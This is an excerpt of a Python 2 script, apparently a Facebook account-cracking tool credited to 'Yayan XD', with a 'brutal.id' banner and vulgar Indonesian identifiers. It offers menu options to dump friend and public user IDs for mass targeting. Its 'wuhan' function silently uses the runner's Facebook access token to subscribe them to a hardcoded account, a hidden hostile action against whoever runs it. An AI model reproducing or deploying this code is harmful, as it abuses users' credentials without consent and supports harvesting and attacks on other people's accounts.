...
# coding=utf-8
# Coded By Yayan XD
# My Facebook ( https://www.facebook.com/rizky.nurahman.180)
...
# LO KONTOL
logo = '''\033[0;91m___.                 __         .__       .__    .___ 
\_ |_________ __ ___/  |______  |  |      |__| __| _/ 
 | __ \_  __ \  |  \   __\__  \ |  |      |  |/ __ |  
 \x1b[1;97m| \_\ \  | \/  |  /|  |  / __ \|  |__    |  / /_/ |  
 |___  /__|  |____/ |__| (____  /____/ /\ |__\____ |  
     \/                       \/       \/         \/  '''
...
def yayanxd():
    ...
    try:
        ...
        os.system('xdg-open https://www.facebook.com/rizky.nurahman.180')
        moch_yayan()
    except KeyError:
...
def moch_yayan():
    ...
    print ' (\033[0;96m•\033[0m) NAME USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump id dari  publik'%(O,N);time.sleep(0.03)
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100066663486123/subscribers?access_token=%s'%(kentod))
